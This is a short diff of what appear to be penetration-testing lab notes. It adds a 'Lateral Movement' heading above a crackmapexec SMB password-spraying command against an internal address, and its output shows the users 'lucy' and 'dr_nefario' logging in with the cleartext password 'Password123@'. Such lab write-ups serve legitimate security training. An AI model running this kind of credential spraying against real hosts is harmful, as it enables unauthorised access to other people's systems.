@@ -420,6 +420,9 @@ Mark "lucy" and "dr_nefario" as owned principles
 Add "Password123@" to your "passwords" file
 Add "lucy" and "dr_nefario" to the "users" file
 
+-----------------------------------------------------------------------------------------------------
+Lateral Movement
+
 crackmapexec smb 10.10.1.202 -u users -p passwords --continue-on-success
 (Successful Authentication: dr_nefario:Password123@ and lucy:Password123@)
 
